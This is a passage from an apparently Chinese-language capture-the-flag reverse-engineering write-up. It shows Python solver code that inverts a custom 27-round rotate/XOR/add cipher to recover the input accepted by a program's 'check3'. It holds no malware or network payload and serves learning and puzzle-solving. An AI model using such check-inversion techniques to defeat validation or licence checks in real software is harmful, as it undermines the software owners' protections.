</span></span><span class=line><span class=cl>    <span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span> <span class=o>=</span> <span class=n>final_r0</span><span class=p>,</span> <span class=n>final_r1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>27</span><span class=p>)):</span>  <span class=c1># 26,25,...,0</span>
</span></span><span class=line><span class=cl>        <span class=n>r2_k</span> <span class=o>=</span> <span class=n>R2</span><span class=p>[</span><span class=n>k</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span> <span class=o>=</span> <span class=n>inv_upper_round</span><span class=p>(</span><span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span><span class=p>,</span> <span class=n>r2_k</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span> <span class=o>=</span> <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r0_0</span><span class=p>,</span> <span class=n>r1_0</span> <span class=o>=</span> <span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 阶段 6 逆：拼回 64 位，去掉 XOR c4</span>
</span></span><span class=line><span class=cl>    <span class=n>v</span> <span class=o>=</span> <span class=p>((</span><span class=n>r1_0</span> <span class=o>&amp;</span> <span class=n>mask32</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r0_0</span> <span class=o>&amp;</span> <span class=n>mask32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>v</span> <span class=o>^</span> <span class=mh>0x99d88c4fa4cc68aa</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 逆向减回四个加法</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=mh>0x58e8abfc7618f5fd</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=mh>0xf8a82a8dbdb78c3f</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=mh>0x11a8bb1017e16849</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=mh>0x7209f8c2f24400f7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 逆向 XOR 初始三常量</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>^=</span> <span class=mh>0x311e18c91413b58c</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>^=</span> <span class=mh>0x4303f92241dd9a9f</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>^=</span> <span class=mh>0x95714c91bc8b306f</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>&amp;=</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># -----------------------</span>
</span></span><span class=line><span class=cl><span class=c1># 自测：expected_output -&gt; input_val</span>
</span></span><span class=line><span class=cl><span class=c1># -----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>expected_output</span> <span class=o>=</span> <span class=mh>0x659391a5dc3522b3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>recovered_input</span> <span class=o>=</span> <span class=n>decrypt_from_trace</span><span class=p>(</span><span class=n>expected_output</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;解出 input_val = 0x</span><span class=si>{</span><span class=n>recovered_input</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>check3的解密如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>mask64</span> <span class=o>=</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl><span class=n>mask32</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_A_32bit</span><span class=p>(</span><span class=n>r_in</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r_in</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r_in</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r6</span> <span class=o>^</span> <span class=n>r7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_B_32bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=n>r1</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&amp;</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>        <span class=n>r0</span> <span class=o>=</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r7</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>        <span class=n>r6</span> <span class=o>=</span> <span class=n>r7</span>
</span></span><span class=line><span class=cl>    <span class=n>r0</span> <span class=o>&amp;=</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_C_32bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_D_32bit</span><span class=p>(</span><span class=n>r_in</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r_in</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r_in</span> <span class=o>&gt;&gt;</span> <span class=mi>29</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r6</span> <span class=o>^</span> <span class=n>r7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_E_32bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>r1</span> <span class=o>^</span> <span class=n>r0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>loop_64bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&amp;</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=n>r0</span> <span class=o>=</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r7</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=n>r6</span> <span class=o>=</span> <span class=n>r7</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_r2_schedule</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    只跑 r2,r3,r4,r5 的“下半轮”，得到每一轮上半轮使用的 r2 常量。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>r2</span> <span class=o>=</span> <span class=mh>0x71be74bc</span>
</span></span><span class=line><span class=cl>    <span class=n>r3</span> <span class=o>=</span> <span class=mh>0x1d1a63b5</span>
</span></span><span class=line><span class=cl>    <span class=n>r4</span> <span class=o>=</span> <span class=mh>0xaac04cfd</span>
</span></span><span class=line><span class=cl>    <span class=n>r5</span> <span class=o>=</span> <span class=mh>0x3e36eee3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>R2</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>27</span><span class=p>):</span>  <span class=c1># 0..26</span>
</span></span><span class=line><span class=cl>        <span class=n>R2</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=mh>0x1a</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 最后一轮没有下半轮</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r0_g_in</span> <span class=o>=</span> <span class=n>r3</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_g_in</span> <span class=o>=</span> <span class=n>r2</span>
</span></span><span class=line><span class=cl>        <span class=n>r2_g_in</span> <span class=o>=</span> <span class=n>k</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_A</span> <span class=o>=</span> <span class=n>func_A_32bit</span><span class=p>(</span><span class=n>r0_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_B</span> <span class=o>=</span> <span class=n>func_B_32bit</span><span class=p>(</span><span class=n>r0_H_A</span><span class=p>,</span> <span class=n>r1_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_C</span> <span class=o>=</span> <span class=n>func_C_32bit</span><span class=p>(</span><span class=n>r0_H_B</span><span class=p>,</span> <span class=n>r2_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_H_D</span> <span class=o>=</span> <span class=n>func_D_32bit</span><span class=p>(</span><span class=n>r1_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_H_E</span> <span class=o>=</span> <span class=n>func_E_32bit</span><span class=p>(</span><span class=n>r0_H_C</span><span class=p>,</span> <span class=n>r1_H_D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 更新到下一轮</span>
</span></span><span class=line><span class=cl>        <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>,</span> <span class=n>r4</span><span class=p>,</span> <span class=n>r5</span> <span class=o>=</span> <span class=n>r1_H_E</span><span class=p>,</span> <span class=n>r4</span><span class=p>,</span> <span class=n>r5</span><span class=p>,</span> <span class=n>r0_H_C</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>R2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rol32</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ror32</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_upper_round</span><span class=p>(</span><span class=n>r0_next</span><span class=p>,</span> <span class=n>r1_next</span><span class=p>,</span> <span class=n>r2_k</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    逆向一轮上半轮: 给定输出 (r0_next,r1_next) 和 r2_k,
</span></span></span><span class=line><span class=cl><span class=s2>    求上一轮输入 (r0_prev,r1_prev)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>c0</span> <span class=o>=</span> <span class=n>r0_next</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>e1</span> <span class=o>=</span> <span class=n>r1_next</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>d1</span> <span class=o>=</span> <span class=p>(</span><span class=n>e1</span> <span class=o>^</span> <span class=n>c0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r1_prev</span> <span class=o>=</span> <span class=n>ror32</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>        <span class=c1># 逆 D: ROL3 -&gt; ROR3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b0</span> <span class=o>=</span> <span class=p>(</span><span class=n>c0</span> <span class=o>^</span> <span class=n>r2_k</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>     <span class=c1># 逆 C: XOR r2_k</span>
</span></span><span class=line><span class=cl>    <span class=n>a0</span> <span class=o>=</span> <span class=p>(</span><span class=n>b0</span> <span class=o>-</span> <span class=n>r1_prev</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>  <span class=c1># 逆 B: 加法 -&gt; 减法</span>
</span></span><span class=line><span class=cl>    <span class=n>r0_prev</span> <span class=o>=</span> <span class=n>rol32</span><span class=p>(</span><span class=n>a0</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>        <span class=c1># 逆 A: ROR8 -&gt; ROL8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_from_cipher</span><span class=p>(</span><span class=n>cipher</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 1) 先把最终 64 位 XOR 拆开</span>
</span></span><span class=line><span class=cl>    <span class=n>final_r0</span> <span class=o>=</span> <span class=n>cipher</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>final_r1</span> <span class=o>=</span> <span class=p>(</span><span class=n>cipher</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2) 逆 32 位主循环: 从 k=26..0 逐轮恢复</span>
</span></span><span class=line><span class=cl>    <span class=n>R2</span> <span class=o>=</span> <span class=n>build_r2_schedule</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span> <span class=o>=</span> <span class=n>final_r0</span><span class=p>,</span> <span class=n>final_r1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>27</span><span class=p>)):</span>     <span class=c1># 26,25,...,0</span>
</span></span><span class=line><span class=cl>        <span class=n>r2_k</span> <span class=o>=</span> <span class=n>R2</span><span class=p>[</span><span class=n>k</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span> <span class=o>=</span> <span class=n>inv_upper_round</span><span class=p>(</span><span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span><span class=p>,</span> <span class=n>r2_k</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span> <span class=o>=</span> <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r0_0</span><span class=p>,</span> <span class=n>r1_0</span> <span class=o>=</span> <span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 合并成 64 位，得到进入 32 位轮前的值</span>
</span></span><span class=line><span class=cl>    <span class=n>v</span> <span class=o>=</span> <span class=p>((</span><span class=n>r1_0</span> <span class=o>&amp;</span> <span class=n>mask32</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r0_0</span> <span class=o>&amp;</span> <span class=n>mask32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3) 逆 64 位部分: 减常量 / XOR 常量</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>k1</span> <span class=o>=</span> <span class=mh>0x52591d5fa111b92e</span>
</span></span><span class=line><span class=cl>    <span class=n>k2</span> <span class=o>=</span> <span class=mh>0x9eaac37a5d0b1747</span>
</span></span><span class=line><span class=cl>    <span class=n>k3</span> <span class=o>=</span> <span class=mh>0xb98bdad21178175e</span>
</span></span><span class=line><span class=cl>    <span class=n>k4</span> <span class=o>=</span> <span class=mh>0x94c6e3f48118560b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>c1</span> <span class=o>=</span> <span class=mh>0xc7e29a0a50ac78e3</span>
</span></span><span class=line><span class=cl>    <span class=n>c2</span> <span class=o>=</span> <span class=mh>0xead13c41399fcfd6</span>
</span></span><span class=line><span class=cl>    <span class=n>c3</span> <span class=o>=</span> <span class=mh>0x15f909ccb556ec05</span>
</span></span><span class=line><span class=cl>    <span class=n>c4</span> <span class=o>=</span> <span class=mh>0xe885b64f981d1baa</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>v</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=n>k4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>^=</span> <span class=n>c4</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=n>k3</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>^=</span> <span class=n>c3</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=n>k2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>^=</span> <span class=n>c2</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>^=</span> <span class=n>c1</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=n>k1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=mh>0x5538224d4c7a252a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pt</span> <span class=o>=</span> <span class=n>decrypt_from_cipher</span><span class=p>(</span><span class=n>cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;解出的明文: 0x</span><span class=si>{</span><span class=n>pt</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
